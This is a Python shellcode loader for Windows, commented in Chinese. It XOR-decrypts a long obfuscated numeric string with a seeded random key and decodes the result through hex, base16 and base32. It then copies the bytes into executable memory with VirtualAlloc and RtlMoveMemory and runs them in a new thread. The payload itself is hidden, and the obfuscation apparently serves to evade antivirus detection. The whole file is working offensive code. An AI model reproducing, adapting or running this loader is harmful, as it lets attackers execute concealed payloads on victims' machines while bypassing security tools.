# -*- coding: UTF-8 -*-
import ctypes
import base64
import random
from sys import version_info


def decrypt(code, key):
    # 异或解密
    random.seed(key)
    xor_code = code.split('.')
    res_code = ''
    for i in xor_code:
        res_code = res_code + chr(int(i) ^ random.randint(0, 255))
    # 三重解码
    if version_info >= (3,0):
        shellcode = bytes.fromhex(res_code)
    else:
        shellcode = res_code.decode('hex')
    shellcode = base64.b16decode(shellcode)
    shellcode = base64.b32decode(shellcode)
    # 返回shellcode
    return shellcode

def runcode(shellcode):
    # 加载shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

if __name__ == "__main__":
    # 混淆的shellcode
    code = "176.131.150.36.158.21.18.156.222.102.196.188.159.34.160.190.158.68.46.114.117.149.8.219.136.86.11.194.111.90.101.140.166.69.51.202.65.178.118.92.64.110.43.252.230.20.15.45.64.122.88.237.114.117.255.125.17.207.121.133.41.11.98.80.188.91.142.4.157.208.39.152.167.53.185.165.105.20.37.184.240.20.212.178.242.62.224.17.167.85.34.50.184.194.209.44.67.152.39.180.232.220.236.191.14.230.131.42.84.199.152.252.152.115.28.87.224.199.97.173.41.25.216.228.114.206.101.89.198.241.203.70.178.46.40.35.61.37.83.219.225.203.196.110.111.51.126.145.32.136.45.242.166.202.169.237.42.41.134.180.8.31.113.193.189.239.30.77.30.114.186.81.159.151.239.244.201.232.176.198.16.239.120.62.219.35.224.97.180.209.170.18.119.90.194.106.112.92.210.162.157.245.10.254.73.17.101.175.185.73.146.174.213.107.132.10.15.122.139.30.175.234.155.45.174.55.198.153.19.245.253.195.46.249.87.159.213.225.254.143.116.199.226.252.153.135.63.126.86.239.85.130.134.195.209.162.237.248.23.130.82.107.177.120.70.76.146.246.208.51.121.187.156.236.47.145.36.19.240.248.154.158.239.118.19.139.252.215.172.241.75.107.99.76.153.136.86.227.160.194.34.134.36.214.184.152.148.55.94.151.45.70.195.214.191.222.112.50.77.174.17.7.66.93.23.44.69.185.30.100.98.89.117.54.154.136.121.205.186.244.116.244.187.221.72.6.238.40.56.94.207.89.192.71.159.43.204.25.151.32.75.208.191.28.142.22.98.110.208.21.205.57.1.213.249.230.5.96.176.32.247.181.144.23.171.246.8.66.227.117.181.50.165.154.175.141.48.207.175.125.187.109.72.10.225.235.250.82.180.18.51.247.208.13.80.88.169.108.114.56.120.193.36.228.194.234.239.46.180.248.40.133.13.82.167.165.51.75.248.166.203.171.252.89.167.206.195.107.7.160.18.75.244.227.26.52.36.226.26.184.248.190.43.209.187.64.218.21.245.49.62.129.148.50.139.207.151.250.168.67.39.237.243.165.53.41.164.253.132.210.90.161.204.170.193.221.221.162.180.176.41.94.110.28.149.186.15.132.226.129.46.99.182.3.113.189.68.91.207.119.94.43.160.80.64.136.208.240.46.184.141.113.147.50.30.28.120.197.19.252.235.183.216.138.44.242.100.101.58.163.225.106.50.228.139.227.56.201.116.67.199.184.206.213.104.4.112.204.105.45.84.5.75.58.226.222.180.125.58.202.1.51.140.21.193.180.123.118.251.53.209.166.199.76.148.139.188.37.226.3.124.180.189.215.184.230.252.22.178.110.240.32.40.233.187.55.14.158.233.55.221.202.98.89.240.245.180.80.164.199.104.186.200.93.88.225.60.43.205.121.177.62.25.189.54.125.215.202.10.141.6.246.6.226.154.165.16.145.115.103.77.21.114.13.49.63.126.192.180.160.117.161.232.243.204.165.111.199.251.164.109.88.44.17.39.4.177.30.157.178.170.18.119.33.50.169.229.174.101.70.196.82.74.184.96.34.188.174.247.89.230.96.53.122.47.249.144.1.26.236.77.168.59.94.32.11.178.239.58.187.13.29.53.97.206.21.147.210.189.65.11.181.241.76.0.124.241.236.55.222.103.87.58.202.175.87.199.233.216.30.213.15.81.107.192.88.121.183.14.223.144.0.93.150.205.22.238.245.17.1.236.243.122.197.204.84.71.93.144.46.34.163.47.147.232.205.190.86.231.197.248.18.188.54.126.129.95.215.108.210.253.42.180.65.230.115.188.91.255.0.226.106.88.115.100.165.191.139.233.202.90.252.178.15.51.41.90.20.253.50.86.98.97.88.65.105.94.92.109.185.20.210.163.146.7.239.113.211.206.76.131.195.190.215.229.210.164.85.212.29.156.70.100.4.49.91.9.19.59.208.38.200.22.166.97.218.127.204.181.110.213.43.44.212.201.84.158.87.18.100.118.213.198.10.203.7.204.157.43.98.40.184.195.89.103.5.178.104.159.190.217.0.83.232.159.240.198.180.126.9.96.252.168.129.206.178.103.17.7.49.74.207.48.108.225.25.226.236.182.91.146.255.52.253.8.239.74.229.140.10.212.150.243.28.28.146.217.167.101.50.10.210.186.135.157.105.67.123.119.30.87.151.22.2.25.125.78.80.210.110.60.2.185.236.6.68.107.29.224.100.107.10.248.245.109.102.20.16.175.45.115.86.144.72.150.212.197.151.150.179.202.126.9.61.72.110.186.106.167.46.145.137.224.237.43.4.104.114.242.216.209.128.14.8.71.15.64.113.140.100.142.40.217.251.136.37.184.188.197.54.38.65.137.202.114.103.1.231.126.84.52.140.165.68.190.246.101.229.84.28.249.130.172.157.222.47.237.154.41.229.251.162.223.43.197.208.222.67.128.173.92.217.176.1.242.50.206.201.181.208.244.24.44.40.33.86.144.216.56.242.201.72.224.241.85.144.90.213.48.37.16.232.176.218.53.219.92.96.103.201.167.150.55.96.180.155.130.80.162.157.103.245.99.46.142.52.138.127.229.187.182.119.247.120.186.86.121.164.56.72.130.97.210.234.180.130.103.38.214.189.3.49.18.27.31.65.45.11.162.80.120.162.96.122.56.199.213.35.109.118.220.202.211.82.174.129.36.241.218.36.184.4.247.254.236.61.147.137.241.91.210.201.193.255.215.30.11.216.206.177.15.114.205.206.24.105.81.230.71.205.19.239.186.79.206.164.211.73.241.193.96.81.124.92.224.34.158.0.250.237.245.124.187.40.79.146.14.60.200.30.189.157.117.139.141.50.34.60.38.1.70.105.209.36.111.2.62.198.232.113.200.198.46.104.72.65.160.0.212.252.122.2.33.44.154.87.240.93.152.216.117.205.123.96.23.76.16.176.186.240.70.106.244.82.179.36.48.214.62.244.176.94.11.231.180.214.237.89.202.89.110.132.180.169.30.127.147.155.38.192.15.165.179.218.229.149.14.134.254.108.55.179.227.193.47.9.130.189.168.108.92.46.5.205.179.42.78.103.230.60.226.77.36.73.187.242.240.109.30.70.232.73.34.179.194.89.173.92.40.68.158.188.199.9.107.143.156.162.106.103.51.142.55.47.85.130.195.146.88.149.71.113.35.139.186.117.51.197.226.76.62.113.54.65.216.55.227.9.164.177.72.12.28.29.209.220.16.93.191.132.76.237.110.232.4.25.28.148.9.62.116.0.78.25.143.91.89.43.241.175.160.113.188.105.242.81.255.146.144.56.46.109.172.5.59.212.241.141.224.229.48.9.173.26.153.219.140.200.123.239.244.33.107.122.235.20.95.5.39.32.48.114.65.198.140.231.199.252.57.242.36.48.62.156.60.41.119.130.63.83.210.87.247.133.147.254.252.175.0.92.136.21.34.225.25.96.201.109.26.218.148.227.244.109.244.39.179.167.145.154.146.141.255.187.1.38.216.44.91.206.143.198.63.136.80.175.213.161.197.151.13.192.140.44.231.61.208.153.175.123.90.227.121.123.232.160.170.232.100.105.79.150.62.186.5.74.20.183.217.221.79.33.102.207.4.114.86.84.77.153.211.223.196.210.240.20.237.93.228.193.137.138.4.31.32.63.146.143.155.229.135.123.225.196.31.54.118.12.191.176.41.9.177.57.98.128.171.211.77.94.115.27.76.55.149.12.79.147.158.242.111.29.210.37.182.100.161.114.92.169.41.239.247.209.36.60.148.4.95.110.139.152.26.54.238.123.84.132.48.76.25.226.206.186.190.52.196.125.195.198.37.231.213.251.126.213.177.198.142.104.201.104.64.27.64.10.208.87.78.111.98.106.240.96.2.109.11.79.74.122.94.95.203.74.91.247.218.9.253.175.240.100.174.13.142.134.244.179.144.232.241.128.150.238.116.169.28.1.46.205.203.80.204.200.168.162.250.186.43.85.132.135.136.102.71.162.121.190.231.248.145.212.138.49.205.201.218.12.93.247.151.178.26.140.219.12.85.195.59.146.131.196.153.138.117.196.43.168.244.132.20.36.210.185.220.141.211.196.216.179.60.162.139.89.118.147.64.122.203.13.177.97.175.23.59.141.214.200.193.64.112.47.122.191.124.133.120.174.173.134.43.208.38.250.222.230.78.216.140.15.58.130.222.238.36.110.232.30.157.228.3.226.98.82.157.227.198.241.242.233.202.162.83.136.55.249.52.53.125.135.6.124.22.76.108.82.8.90.96.200.207.57.22.169.72.187.253.137.103.237.59.154.138.190.133.1.159.117.84.151.4.192.195.112.229.9.240.59.59.195.216.254.73.203.187.225.27.232.185.139.180.11.9.250.73.165.196.175.90.77.64.176.78.201.88.89.153.93.103.209.152.107.152.239.239.223.156.71.44.32.25.159.96.13.169.66.212.146.201.229.176.113.10.37.239.173.171.132.249.89.167.216.111.48.22.115.135.156.95.219.18.27.178.153.168.189.38.84.213.69.150.106.113.52.111.16.93.212.23.205.251.23.248.224.18.228.37.250.254.58.13.147.150.124.194.231.108.61.105.41.147.227.152.165.62.28.165.159.168.224.224.226.94.189.121.250.65.142.80.138.109.80.221.133.0.183.164.87.196.228.204.202.134.27.26.232.33.211.39.73.23.68.178.75.163.236.151.59.254.137.16.176.194.12.155.51.213.227.226.128.53.174.178.212.176.88.22.31.243.53.159.170.73.21.53.144.228.52.231.161.83.67.187.205.54.154.113.25.253.36.177.195.229.51.97.168.191.227.136.140.236.27.137.162.208.152.152.162.179.157.153.38.101.147.228.181.248.222.31.135.73.184.77.142.125.51.220.81.152.49.245.227.231.230.19.153.109.250.23.155.33.66.109.190.6.208.14.154.245.117.214.116.47.156.127.172.20.246.177.103.203.23.92.18.221.202.203.26.205.177.172.41.80.131.97.157.123.125.73.109.32.107.94.100.32.176.180.237.83.46.169.214.212.228.250.24.101.55.104.231.205.76.173.193.177.246.230.83.110.115.17.163.191.64.67.158.74.236.248.201.166.201.21.5.8.14.24.119.207.139.12.171.130.151.254.52.249.7.81.180.97.99.59.45.175.152.187.135.118.100.215.163.196.160.213.174.24.107.173.147.198.185.59.245.33.219.162.99.108.170.67.57.181.64.132.121.225.90.191.76.182.182.208.227.249.15.195.113.81.164.228.206.40.202.242.108.88.216.18.159.12.226.53.205.57.190.165.222.252.120.245.179.184.232.194.58.85.36.133.13.192.201.15.7.115.215.122.158.116.133.193.120.36.145.105.211.53.255.101.97.183.252.15.219.6.90.15.4.74.93.236.72.135.193.138.99.213.57.170.188.138.189.130.210.87.50.14.19.96.55.22.33.78.73.99.111.56.111.202.63.7.128.160.142.66.109.244.44.92.80.7.147.218.45.218.173.155.63.248.48.202.172.140.141.54.167.91.145.39.161.137.169.28.98.34.212.160.52.116.95.8.30.84.31.175.94.8.109.252.186.206.247.201.6.24.254.197.79.80.50.252.226.74.72.103.166.45.51.2.84.108.77.211.206.147.113.229.64.180.138.253.99.58.116.24.65.203.44.18.103.8.133.224.213.224.104.143.249.196.43.58.216.10.248.195.107.28.53.87.117.225.75.239.231.59.141.8.16.73.108.113.50.167.148.62.201.154.249.10.255.121.92.12.82.127.35.204.76.86.27.171.82.115.115.226.186.111.60.254.196.55.21.84.246.32.246.68.87.203.83.55.147.51.163.94.192.113.61.132.216.196.77.85.236.99.167.82.103.17.85.248.15.223.233.134.175.87.232.72.59.108.61.201.244.15.16.14.154.145.233.152.215.51.10.191.167.97.3.222.82.96.210.15.47.139.174.191.212.121.53.17.57.52.68.165.185.31.167.54.135.45.157.219.221.120.201.230.116.195.18.73.148.246.207.130.214.139.119.254.125.209.9.82.121.28.64.191.254.161.242.190.115.100.89.214.67.64.149.246.92.16.227.42.5.206.112.116.74.217.9.175.115.159.76.54.161.255.67.222.88.17.73.173.32.168.135.56.142.32.204.232.3.157.97.24.162.177.248.1.122.97.95.128.94.117.203.174.24.79.139.23.2.89.69.92.138.206.220.149.249.169.55.249.1.253.104.204.149.90.198.197.22.227.149.200.175.162.181.17.216.180.16.136.7.127.201.67.55.47.143.206.35.83.172.163.236.207.186.3.65.210.55.237.239.9.151.11.147.142.93.88.113.71.46.69.5.231.109.217.232.36.71.20.191.106.158.119.48.246.25.30.146.163.156.168.63.85.193.102.106.41.177.55.102.199.131.117.44.145.93.138.1.225.151.28.73.102.159.92.221.184.130.116.211.80.241.40.169.47.254.84.128.179.153.126.251.151.112.56.107.168.71.242.251.236.217.73.100.62.240.237.65.55.162.120.21.184.215.130.0.178.234.140.139.192.242.61.146.185.23.87.157.42.217.1.205.152.224.134.145.242.152.80.240.31.130.194.89.79.26.194.106.216.201.149.86.4.113.252.83.216.166.133.29.145.185.208.226.155.190.185.185.182.25.108.64.24.95.117.254.94.157.241.66.252.153.78.52.187.77.28.196.191.247.141.32.74.39.194.234.95.95.220.57.101.171.179.36.221.46.144.130.145.10.37.132.21.249.125.85.95.95.189.115.49.237.52.212.153.223.9.209.71.243.62.119.163.161.5.36.241.121.120.31.95.98.124.131.221.240.128.174.190.83.236.161.92.98.228.134.217.161.19.67.119.30.216.29.47.247.112.58.58.134.158.43.69.146.241.123.35.84.42.88.195.244.119.93.167.214.180.151.58.47.51.28.170.146.116.205.180.62.188.114.218.173.122.236.49.100.17.188.157.69.123.69.231.223.252.199.21.225.237.59.179.106.213.64.56.129.177.162.108.82.155.179.26.174.101.25.71.219.39.139.164.90.230.179.11.8.130.236.27.136.135.149.2.40.21.227.24.64.50.204.204.126.248.61.116.127.20.14.214.90.123.102.188.53.215.169.8.246.179.43.91.178.22.47.190.11.214.170.143.123.129.65.28.119.208.17.253.174.26.224.40.76.197.154.84.146.33.223.60.109.17.91.187.111.190.7.232.223.183.91.244.76.45.162.164.184.179.21.163.122.46.222.191.102.25.30.8.199.146.3.85.13.238.225.198.179.140.165.51.21.50.30.171.111.19.96.188.244.45.226.206.137.93.20.54.172.56.184.162.18.141.11.6.8.53.244.198.31.223.104.155.21.212.5.81.135.201.216.144.216.29.73.221.174.195.186.11.173.100.189.49.226.54.185.121.84.141.239.119.187.242.68.133.249.99.228.246.255.190.53.162.237.215.99.122.205.78.43.82.22.36.72.218.222.53.155.177.87.88.102.247.128.196.163.28.112.205.31.230.12.52.98.154.0.57.49.240.104.155.110.105.113.40.152.127.8.235.71.129.24.207.194.70.191.122.85.199.82.236.43.73.139.164.236.82.146.47.37.76.105.167.191.178.173.163.1.92.104.58.237.155.66.174.67.111.90.69.45.149.149.107.62.216.116.92.80.72.47.43.116.239.45.71.179.47.179.101.188.128.171.79.185.143.203.100.202.151.37.164.105.162.189.181.97.82.58.5.242.58.54.6.244.176.51.27.53.189.19.224.108.173.56.92.36.24.20.12.239.247.155.108.53.95.203.24.193.166.214.30.174.110.189.208.13.91.153.89.238.150.103.143.202.190.75.64.212.90.188.39.119.123.128.212.148.105.163.76.127.63.132.200.119.137.38.208.255.150.211.61.222.216.8.160.149.54.180.45.111.213.117.253.12.225.121.17.12.129.221.0.168.218.210.250.113.243.144.242.228.41.159.72.210.241.147.233.212.128.207.67.151.104.230.231.112.25.98.140.201"
    # 随机数key
    key: str = 'B4s81a'
    # 解码
    shellcode = decrypt(code, key)
    runcode(shellcode)